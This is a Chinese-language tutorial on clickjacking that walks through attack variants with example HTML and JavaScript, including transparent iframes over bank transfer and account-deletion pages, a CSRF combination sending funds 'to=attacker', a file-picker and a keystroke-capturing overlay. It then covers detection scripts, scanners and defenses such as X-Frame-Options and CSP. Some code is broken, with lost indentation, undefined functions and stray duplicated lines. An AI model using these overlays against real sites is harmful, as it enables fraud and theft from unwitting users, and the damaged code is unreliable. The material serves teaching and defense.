# 点击劫持漏洞

## 1. 漏洞原理

### 1.1 基本概念

点击劫持（Clickjacking），又称UI覆盖攻击（UI Redressing），是一种视觉欺骗技术。攻击者通过透明或不透明的图层，诱使用户在不知情的情况下点击恶意按钮或链接。

### 1.2 核心攻击机制

+-----------------------------------+
|   恶意网页（可见层）               |
|  [看起来有趣的按钮] ← 用户实际点击  |
+-----------------------------------+
|   透明iframe（隐藏层）             |
|  [银行转账确认按钮] ← 实际触发操作  |
+-----------------------------------+

### 1.3 技术基础

- **CSS z-index属性** - 控制图层叠加顺序

- **iframe透明度** - opacity: 0 或 filter: alpha(opacity=0)

- **浏览器同源策略绕过** - 利用iframe嵌入跨域内容

- **社会工程学** - 诱使用户交互的心理技巧

## 2. 漏洞分类

### 2.1 基于技术实现的分类

#### 2.1.1 传统点击劫持

```html
<!-- 基本点击劫持示例 -->
<style>
    .malicious-button {
        position: absolute;
        top: 300px;
        left: 400px;
        z-index: 2;
        opacity: 0.9;
    }
    .target-iframe {
        position: absolute;
        top: 250px;
        left: 350px;
        z-index: 1;
        opacity: 0.1;
        width: 500px;
        height: 400px;
    }
</style>

<div class="malicious-button">
    <button>点击赢取大奖！</button>
</div>
<iframe class="target-iframe" src="https://target-bank.com/transfer"></iframe>
```

<!-- 基本点击劫持示例 -->

#### 2.1.2 光标劫持（Cursorjacking）

```css
/* 修改光标位置与实际点击位置不一致 */
.malicious-element {
 cursor: url('transparent.cur'), auto;
 position: relative;
 left: -50px; /* 光标与实际点击位置偏移 */
}
```

#### 2.1.3 拖放劫持（Drag-and-Drop Jacking）

```javascript
// 劫持拖放操作获取敏感数据
document.addEventListener('dragstart', function(e) {
 // 窃取被拖拽的数据
 var stolenData = e.dataTransfer.getData('text');
 sendToAttacker(stolenData);
});
```

### 2.2 基于攻击目标的分类

#### 2.2.1 社交媒体劫持

- 点赞、关注、分享等操作

- 隐私设置修改

#### 2.2.2 金融操作劫持

- 银行转账确认

- 支付授权

- 交易确认

#### 2.2.3 管理员功能劫持

- 网站管理操作

- 用户权限修改

- 内容删除操作

#### 2.2.4 摄像头/麦克风劫持

```html
<!-- 诱骗用户点击摄像头权限请求 -->
<iframe src="https://video-call-site.com" style="opacity:0;position:fixed;top:0;left:0;width:100%;height:100%"></iframe>
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%)">
    <button>点击开始游戏</button>
</div>
```

<!-- 诱骗用户点击摄像头权限请求 -->

## 3. 攻击技术细节

### 3.1 基础覆盖技术

#### 3.1.1 透明iframe覆盖

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        #decoy {
            position: absolute;
            top: 250px;
            left: 400px;
            z-index: 2;
            background: #ff4444;
            padding: 20px;
            border-radius: 5px;
        }
        #target {
            position: absolute;
            top: 200px;
            left: 350px;
            z-index: 1;
            opacity: 0.001;
            width: 600px;
            height: 500px;
            border: none;
        }
    </style>
</head>
<body>
    <div id="decoy">
        <h3>恭喜您获得一等奖！</h3>
        <button onclick="alert('您已被劫持！')">立即领取</button>
    </div>

    <iframe id="target" src="https://vulnerable-site.com/delete-account"></iframe>
</body>
</html>
```

<!DOCTYPE html>

#### 3.1.2 多图层精准定位

```html
<style>
    .attack-container {
        position: relative;
        width: 800px;
        height: 600px;
    }
    .target-frame {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.01;
        z-index: 1;
    }
    .overlay-button {
        position: absolute;
        top: 450px;    /* 对应目标按钮Y坐标 */
        left: 320px;   /* 对应目标按钮X坐标 */
        width: 120px;  /* 对应目标按钮宽度 */
        height: 40px;  /* 对应目标按钮高度 */
        z-index: 2;
        opacity: 0.9;
        cursor: pointer;
    }
</style>

<div class="attack-container">
    <iframe class="target-frame" src="https://bank.com/transfer"></iframe>
    <div class="overlay-button"></div>
</div>
```

### 3.2 高级绕过技术

#### 3.2.1 浏览器缩放绕过

```javascript
// 强制浏览器缩放，改变元素相对位置
function zoomPage() {
 document.body.style.zoom = "0.8";
 // 或使用transform
 document.body.style.transform = "scale(0.8)";
 document.body.style.transformOrigin = "0 0";
}
```

#### 3.2.2 视口移动攻击

```javascript
// 通过滚动改变可视区域
window.scrollTo(0, 100);

// 或使用CSS transform
document.documentElement.style.transform = "translateY(100px)";
```

#### 3.2.3 双iframe技术

```html
<!-- 外层iframe绕过X-Frame-Options -->
<iframe src="https://legitimate-site.com" id="outerFrame"></iframe>

<script>
    // 在内层进行点击劫持
    var outerFrame = document.getElementById('outerFrame');
    outerFrame.onload = function() {
        var innerDoc = outerFrame.contentDocument;
        innerDoc.write(`
            <iframe src="https://target-site.com" style="opacity:0.1"></iframe>
            <div style="position:absolute;top:300px;left:400px;z-index:9999">
                <button>点击我</button>
            </div>
        `);
    };
</script>
```

<!-- 外层iframe绕过X-Frame-Options -->

<iframe src="https://legitimate-site.com" id="outerFrame"></iframe>

### 3.3 移动端特定攻击

#### 3.3.1 触摸劫持（Tapjacking）

```html
<!-- 移动端触摸事件劫持 -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
    .malicious-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: transparent;
        z-index: 10000;
    }
    .fake-button {
        position: absolute;
        bottom: 50px;
        left: 50%;
        transform: translateX(-50%);
        padding: 15px 30px;
        background: #4CAF50;
        color: white;
        border: none;
        border-radius: 5px;
        font-size: 18px;
    }
</style>

<div class="malicious-overlay">
    <button class="fake-button">继续阅读</button>
</div>
<iframe src="https://mobile-app.com/payment" style="opacity:0;width:100%;height:100%"></iframe>
```

<!-- 移动端触摸事件劫持 -->

<meta name="viewport" content="width=device-width, initial-scale=1.0">

#### 3.3.2 手势劫持

```javascript
// 劫持手势操作
document.addEventListener('touchstart', function(e) {
 // 阻止默认行为，实现自定义手势
 e.preventDefault();
```

// 记录触摸位置
var touch = e.touches[0];
startX = touch.clientX;
startY = touch.clientY;

```
});

document.addEventListener('touchend', function(e) {
 // 在触摸结束时触发恶意操作
 triggerMaliciousAction();
});
```

## 4. 组合攻击技术

### 4.1 点击劫持 + CSRF

#### 4.1.1 组合攻击流程

1. 用户登录目标网站（保持会话）
2. 访问恶意页面，包含隐藏的目标网站iframe
3. 用户点击诱饵按钮，实际触发目标网站操作
4. 利用活跃会话执行敏感操作

#### 4.1.2 技术实现

```html
<!-- 结合CSRF令牌的点击劫持 -->
<iframe src="https://bank.com/transfer?to=attacker&amount=1000&csrf=auto" 
        style="opacity:0;position:fixed;top:0;left:0;width:100px;height:100px">
</iframe>

<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%)">
    <button>观看精彩视频</button>
</div>

<script>
    // 自动获取并填充CSRF令牌
    window.addEventListener('message', function(e) {
        if (e.origin === 'https://bank.com') {
            var csrfToken = e.data.csrfToken;
            document.querySelector('iframe').src = 
                `https://bank.com/transfer?to=attacker&amount=1000&csrf=${csrfToken}`;
        }
    });
</script>
```

<!-- 结合CSRF令牌的点击劫持 -->

<iframe src="https://bank.com/transfer?to=attacker&amount=1000&csrf=auto" 
        style="opacity:0;position:fixed;top:0;left:0;width:100px;height:100px">
</iframe>

### 4.2 点击劫持 + 文件上传

#### 4.2.1 文件选择器劫持

```html
<style>
    #file-overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.01;
        z-index: 2;
        cursor: pointer;
    }
    #decoy {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 1;
    }
</style>

<div id="decoy">
    <h2>选择您的头像</h2>
    <p>点击下方区域上传图片</p>
</div>

<iframe src="https://target.com/upload" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
<input type="file" id="file-overlay" onchange="stealFile(this.files[0])">
```

### 4.3 点击劫持 + 键盘记录

#### 4.3.1 全屏覆盖攻击

```html
<!-- 透明覆盖层捕获所有输入 -->
<div id="overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:transparent;z-index:10000"></div>

<iframe src="https://bank.com/login" style="width:100%;height:100%"></iframe>

<script>
    var overlay = document.getElementById('overlay');

    // 捕获所有键盘输入
    overlay.addEventListener('keydown', function(e) {
        logKeystroke(e.key);
    });

    // 捕获所有点击
    overlay.addEventListener('click', function(e) {
        triggerHiddenAction(e.clientX, e.clientY);
    });
</script>
```

<!-- 透明覆盖层捕获所有输入 -->

## 5. 检测方法

### 5.1 手动检测技术

#### 5.1.1 框架检测脚本

```javascript
// 检测页面是否被嵌入iframe
if (window !== window.top) {
 // 页面在iframe中加载
 document.body.style.backgroundColor = 'red';
 alert('此页面可能正在遭受点击劫持攻击！');
}

// 更详细的框架检测
function checkFraming() {
 try {
 if (window.self !== window.top) {
 return {
 isFramed: true,
 topUrl: window.top.location.href,
 currentUrl: window.self.location.href
 };
 }
 } catch (e) {
 // 同源策略阻止访问top.location
 return {
 isFramed: true,
 reason: 'Cross-origin frame restriction'
 };
 }
 return { isFramed: false };
}
```

#### 5.1.2 CSS覆盖检测

```javascript
// 检测元素是否被覆盖
function detectOverlay(element) {
 var rect = element.getBoundingClientRect();
 var centerX = rect.left + rect.width / 2;
 var centerY = rect.top + rect.height / 2;

var topElement = document.elementFromPoint(centerX, centerY);

return topElement !== element ? topElement : null;

}

// 定期检查关键元素
setInterval(function() {
 var loginButton = document.getElementById('login-btn');
 var overlay = detectOverlay(loginButton);
 if (overlay) {
 console.warn('检测到可能的覆盖元素:', overlay);
 }
}, 1000);
```

### 5.2 自动化检测工具

#### 5.2.1 浏览器扩展检测

```javascript
// 简单的检测扩展示例
chrome.webNavigation.onCommitted.addListener(function(details) {
 if (details.frameId === 0) { // 仅检查主框架
 chrome.tabs.executeScript(details.tabId, {
 code: ` if (window !== window.top) {
 document.body.style.border = '5px solid red';
 } `
 });
 }
});
```

#### 5.2.2 渗透测试脚本

```python
#!/usr/bin/env python3
import requests
from urllib.parse import urljoin

class ClickjackingTester:
 def __init__(self, target_url):
 self.target_url = target_url
 self.session = requests.Session()

def test_x_frame_options(self):
    """测试X-Frame-Options头部"""
    response = self.session.get(self.target_url)
    headers = response.headers

    if 'X-Frame-Options' in headers:
        xfo = headers['X-Frame-Options'].upper()
        if xfo in ['DENY', 'SAMEORIGIN']:
            return f"Protected by X-Frame-Options: {xfo}"

    return "Vulnerable to clickjacking - No X-Frame-Options"

def test_frame_busting(self):
    """测试框架破坏代码"""
    response = self.session.get(self.target_url)
    content = response.text

    frame_busting_patterns = [
        'if (top !== self)',
        'if (top != window)',
        'X-Frame-Options',
        'frame-busting',
        'framekiller'
    ]

    for pattern in frame_busting_patterns:
        if pattern in content:
            return f"Frame busting code detected: {pattern}"

    return "No frame busting code detected"

def generate_poc(self):
    """生成概念验证页面"""
    poc_html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Clickjacking PoC</title>
        <style>
            #target {{
                position: absolute;
                top: 100px;
                left: 100px;
                width: 800px;
                height: 600px;
                opacity: 0.5;
                z-index: 1;
            }}
            #decoy {{
                position: absolute;
                top: 300px;
                left: 400px;
                z-index: 2;
                background: red;
                padding: 10px;
            }}
        </style>
    </head>
    <body>
        <h1>点击劫持测试页面</h1>
        <div id="decoy">
            <button>点击这里（实际会点击下方iframe）</button>
        </div>
        <iframe id="target" src="{self.target_url}"></iframe>
    </body>
    </html>
    '''

    with open('clickjacking_poc.html', 'w') as f:
        f.write(poc_html)

    return "PoC generated: clickjacking_poc.html"
```

## 6. 防御措施

### 6.1 客户端防御

#### 6.1.1 框架破坏代码（Frame Busting）

```javascript
// 传统框架破坏代码
if (top !== self) {
 top.location = self.location;
}

// 更健壮的框架破坏代码
(function() {
 if (window === window.top) {
 return;
 }


// 防止无限重定向
var breakFrame = true;
try {
    breakFrame = window.self !== window.top;
} catch (e) {
    breakFrame = true;
}

if (breakFrame) {
    // 多种跳出框架的方法
    if (top.location !== self.location) {
        top.location = self.location;
    }

    // 备用方法
    document.write('');
    window.top.location = window.self.location;

    // 终极方法 - 隐藏整个页面
    document.body.style.display = 'none';
    top.location = self.location;
}

})();
```

#### 6.1.2 现代框架破坏技术

```javascript
// 使用Content Security Policy和JavaScript
class FrameProtection {
 constructor() {
 this.checkFrame();
 this.setupEventListeners();
 }


checkFrame() {
    // 使用try-catch绕过某些限制
    try {
        if (window.self !== window.top) {
            this.handleFraming();
        }
    } catch (e) {
        this.handleFraming();
    }
}

handleFraming() {
    // 逐步升级响应
    this.styleProtection();
    this.redirectProtection();
    this.notifyUser();
}

styleProtection() {
    // 使页面在iframe中不可用
    document.body.style.pointerEvents = 'none';
    document.body.style.userSelect = 'none';
}

redirectProtection() {
    // 尝试跳出框架
    try {
        if (top.location.hostname !== self.location.hostname) {
            top.location = self.location;
        }
    } catch (e) {
        // 同源策略阻止，使用其他方法
        window.location = 'https://example.com/framed-warning';
    }
}

notifyUser() {
    // 通知用户可能的安全风险
    const warning = document.createElement('div');
    warning.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:10px;z-index:9999">
            安全警告：此页面可能被恶意网站加载。请不要进行任何操作。
        </div>        `;
    document.body.appendChild(warning);
}

setupEventListeners() {
    // 监听页面可见性变化
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            this.suspectMaliciousActivity();
        }
    });
}

}

new FrameProtection();
```

### 6.2 服务器端防御

#### 6.2.1 HTTP安全头设置

##### X-Frame-Options

```python
# Django中间件示例
class XFrameOptionsMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        response = self.get_response(request)
        response['X-Frame-Options'] = 'DENY'  # 或 'SAMEORIGIN'
        return response

# Flask示例
@app.after_request
def set_xframe_options(response):
    response.headers['X-Frame-Options'] = 'DENY'
    return response
```

##### Content Security Policy (CSP)

```python
# 现代CSP防护
def set_csp_headers(response):
    csp_policy = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline'; "
        "frame-ancestors 'none'; "  # 关键：阻止所有框架嵌入
        "object-src 'none'; "
        "base-uri 'self'"
    )
    response.headers['Content-Security-Policy'] = csp_policy
    return response

# 更灵活的CSP配置
def set_dynamic_csp(request, response):
    allowed_frames = ['https://trusted-partner.com']

    if request.path.startswith('/embed/'):
        # 允许特定页面被嵌入
        frame_ancestors = "frame-ancestors 'self' https://trusted-partner.com"
    else:
        # 默认阻止所有框架
        frame_ancestors = "frame-ancestors 'none'"

    csp = f"default-src 'self'; {frame_ancestors};"
    response.headers['Content-Security-Policy'] = csp
    return response
```

#### 6.2.2 会话安全增强

```python
结合点击劫持防护的会话管理

def sensitive_action_protection(request):
 """敏感操作额外防护"""

# 检查Referer头
referer = request.headers.get('Referer', '')
if not referer.startswith('https://yourdomain.com'):
    return JsonResponse({'error': 'Invalid request origin'}, status=403)

# 检查自定义头（针对AJAX请求）
if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
    return JsonResponse({'error': 'Invalid request type'}, status=403)

# 生成并验证一次性令牌
csrf_token = request.POST.get('csrf_token')
if not validate_csrf_token(csrf_token):
    return JsonResponse({'error': 'Invalid CSRF token'}, status=403)

# 记录安全事件
log_security_event(request, 'sensitive_action_attempt')

return proceed_with_action(request)
```

### 6.3 用户体验友好的防护

#### 6.3.1 可见性检测与用户提示

```javascript
class UserAwareProtection {
 constructor() {
 this.setupVisibilityMonitoring();
 this.setupUserInteractionTracking();
 }

setupVisibilityMonitoring() {
    // 监听页面可见性变化
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            this.onPageHidden();
        } else {
            this.onPageVisible();
        }
    });

    // 监听窗口焦点变化
    window.addEventListener('blur', () => this.onWindowBlur());
    window.addEventListener('focus', () => this.onWindowFocus());
}

setupUserInteractionTracking() {
    // 跟踪异常的用户交互模式
    let lastInteraction = Date.now();

    document.addEventListener('click', (e) => {
        const now = Date.now();
        const timeSinceLast = now - lastInteraction;

        // 检测异常快速的连续点击
        if (timeSinceLast < 100) { // 100ms内多次点击
            this.suspectAutomatedActivity();
        }

        lastInteraction = now;
    });
}

onPageHidden() {
    // 页面被隐藏时降低敏感功能
    this.disableSensitiveFeatures();
    this.showSecurityWarning('页面已隐藏，敏感功能已禁用');
}

onPageVisible() {
    // 页面重新可见时要求重新认证
    if (this.wasHidden) {
        this.requireReauthentication();
    }
}

requireReauthentication() {
    // 对敏感操作要求重新认证
    const modal = document.createElement('div');
    modal.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:10000;display:flex;align-items:center;justify-content:center;">
            <div style="background:white;padding:20px;border-radius:5px;">
                <h3>安全验证</h3>
                <p>请确认是您本人在操作</p>
                <button onclick="this.parentElement.parentElement.parentElement.remove()">确认继续</button>
            </div>
        </div>        `;
    document.body.appendChild(modal);
}

}
```

## 7. 高级防护技术

### 7.1 基于行为的检测

#### 7.1.1 鼠标移动分析

```javascript
class BehavioralAnalysis {
 constructor() {
 this.mouseMovements = [];
 this.setupMouseTracking();
 }

setupMouseTracking() {
    document.addEventListener('mousemove', (e) => {
        this.mouseMovements.push({
            x: e.clientX,
            y: e.clientY,
            timestamp: Date.now()
        });

        // 保持最近100个移动点
        if (this.mouseMovements.length > 100) {
            this.mouseMovements.shift();
        }
    });

    document.addEventListener('click', (e) => {
        if (this.isSuspiciousClick(e)) {
            this.blockAction(e);
        }
    });
}

isSuspiciousClick(clickEvent) {
    // 分析点击前的鼠标移动模式
    const recentMovements = this.mouseMovements.filter(
        m => clickEvent.timeStamp - m.timestamp < 1000
    );

    if (recentMovements.length === 0) {
        return true; // 没有移动直接点击，可疑
    }

    // 检查移动轨迹是否自然
    return !this.hasNaturalMovement(recentMovements);
}

hasNaturalMovement(movements) {
    // 分析移动模式是否像人类
    let directionChanges = 0;
    let totalDistance = 0;

    for (let i = 1; i < movements.length; i++) {
        const dx = movements[i].x - movements[i-1].x;
        const dy = movements[i].y - movements[i-1].y;
        totalDistance += Math.sqrt(dx*dx + dy*dy);

        if (i > 1) {
            const prevDx = movements[i-1].x - movements[i-2].x;
            const prevDy = movements[i-1].y - movements[i-2].y;

            // 计算方向变化
            const dotProduct = dx*prevDx + dy*prevDy;
            const mag1 = Math.sqrt(dx*dx + dy*dy);
            const mag2 = Math.sqrt(prevDx*prevDx + prevDy*prevDy);

            if (mag1 > 0 && mag2 > 0) {
                const cosAngle = dotProduct / (mag1 * mag2);
                if (Math.abs(cosAngle) < 0.7) { // 角度变化较大
                    directionChanges++;
                }
            }
        }
    }

    // 人类鼠标移动通常有较多的方向变化
    return directionChanges > movements.length * 0.1;
}

blockAction(event) {
    event.preventDefault();
    event.stopPropagation();

    // 显示安全警告
    this.showSecurityWarning('检测到异常操作，已阻止');
}

}
```

### 7.2 多因素确认

#### 7.2.1 关键操作确认

```javascript
class CriticalActionProtection {
 constructor() {
 this.setupActionConfirmation();
 }

setupActionConfirmation() {
    // 为关键按钮添加保护
    const criticalButtons = document.querySelectorAll('[data-critical-action]');

    criticalButtons.forEach(button => {
        button.addEventListener('click', (e) => {
            if (!this.requireConfirmation(e.target)) {
                e.preventDefault();
                e.stopPropagation();
            }
        });
    });
}

requireConfirmation(element) {
    const action = element.dataset.criticalAction;

    // 显示确认对话框
    return this.showConfirmationDialog(action);
}

showConfirmationDialog(action) {
    return new Promise((resolve) => {
        const dialog = document.createElement('div');
        dialog.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;            `;

        dialog.innerHTML = `
            <div style="background: white; padding: 20px; border-radius: 5px; max-width: 400px;">
                <h3>确认操作</h3>
                <p>您正在执行敏感操作: ${action}</p>
                <p>请确认是您本人的操作</p>
                <button id="confirm-action">确认</button>
                <button id="cancel-action">取消</button>
            </div>            `;

        document.body.appendChild(dialog);

        dialog.querySelector('#confirm-action').onclick = () => {
            document.body.removeChild(dialog);
            resolve(true);
        };

        dialog.querySelector('#cancel-action').onclick = () => {
            document.body.removeChild(dialog);
            resolve(false);
        };
    });
}

}
```

## 8. 测试与验证

### 8.1 安全头验证

```python
import requests

def test_clickjacking_protection(url):
 """测试点击劫持防护措施"""
 headers = ['X-Frame-Options', 'Content-Security-Policy']
 results = {}

try:
    response = requests.get(url)

    for header in headers:
        if header in response.headers:
            results[header] = {
                'present': True,
                'value': response.headers[header]
            }
        else:
            results[header] = {
                'present': False,
                'value': None
            }

    # 测试框架破坏代码
    if 'frame-busting' in response.text.lower():
        results['frame_busting'] = True
    else:
        results['frame_busting'] = False

except Exception as e:
    results['error'] = str(e)

return results

# 使用示例

protection_status = test_clickjacking_protection('https://example.com')
print(protection_status)
```

### 8.2 自动化渗透测试

```python
class ClickjackingScanner:
 def __init__(self, target_domain):
 self.target_domain = target_domain
 self.vulnerabilities = []

def comprehensive_scan(self):
    """全面扫描点击劫持漏洞"""
    tests = [
        self.test_xframe_options,
        self.test_csp_header,
        self.test_frame_busting,
        self.test_multiple_paths
    ]

    for test in tests:
        try:
            test()
        except Exception as e:
            print(f"Test {test.__name__} failed: {e}")

    return self.generate_report()

def test_multiple_paths(self):
    """测试多个可能包含敏感操作的路径"""
    sensitive_paths = [
        '/admin',
        '/user/profile',
        '/settings',
        '/transfer',
        '/delete'
    ]

    for path in sensitive_paths:
        url = f"https://{self.target_domain}{path}"
        result = test_clickjacking_protection(url)

        if self.is_vulnerable(result):
            self.vulnerabilities.append({
                'path': path,
                'issues': self.identify_issues(result)
            })

def is_vulnerable(self, protection_result):
    """判断是否存在漏洞"""
    if 'error' in protection_result:
        return False

    # 没有X-Frame-Options或CSP
    if not protection_result['X-Frame-Options']['present']:
        return True

    # X-Frame-Options配置不当
    xfo_value = protection_result['X-Frame-Options']['value']
    if xfo_value and 'ALLOW-FROM' in xfo_value.upper():
        return True  # ALLOW-FROM可能有问题

    # 检查CSP的frame-ancestors
    if protection_result['Content-Security-Policy']['present']:
        csp_value = protection_result['Content-Security-Policy']['value']
        if 'frame-ancestors' not in csp_value.lower():
            return True

    return False

def generate_report(self):
    """生成详细报告"""
    report = {
        'target': self.target_domain,
        'scan_date': datetime.now().isoformat(),
        'vulnerabilities': self.vulnerabilities,
        'protection_score': self.calculate_protection_score()
    }

    return report
```

## 9. 应急响应

### 9.1 漏洞发现后的紧急修复

```python
# 紧急修复中间件

class EmergencyClickjackingFix:
 def __init__(self, get_response):
 self.get_response = get_response

def __call__(self, request):
    response = self.get_response(request)

    # 立即添加防护头
    response['X-Frame-Options'] = 'DENY'

    # 添加临时CSP策略
    response['Content-Security-Policy'] = "frame-ancestors 'none'"

    # 记录安全事件
    self.log_security_event(request)

    return response

def log_security_event(self, request):
    # 记录安全事件以便后续分析
    logger.warning(
        f"Emergency clickjacking protection applied for {request.path}"
    )
```

## 10. 总结

### 10.1 关键风险点

- **缺乏框架限制** - 没有X-Frame-Options或CSP

- **客户端防护不足** - 框架破坏代码容易被绕过

- **敏感操作无确认** - 关键操作缺乏用户确认

- **移动端防护缺失** - 针对触摸设备的特殊攻击

### 10.2 综合防御策略

1. **服务器端防护** - 正确设置安全头（X-Frame-Options、CSP）

2. **客户端防护** - 实现健壮的框架破坏代码

3. **用户教育** - 提高用户对异常页面的警觉性

4. **监控检测** - 实时检测和阻止攻击尝试

5. **深度防御** - 结合多种防护措施

### 10.3 最佳实践清单

- 设置 `X-Frame-Options: DENY` 或 `SAMEORIGIN`

- 配置CSP的 `frame-ancestors` 指令

- 实现健壮的客户端框架破坏代码

- 对敏感操作要求用户确认

- 定期进行安全扫描和渗透测试

- 监控安全头的正确设置

- 教育用户识别可疑页面

- 建立应急响应流程
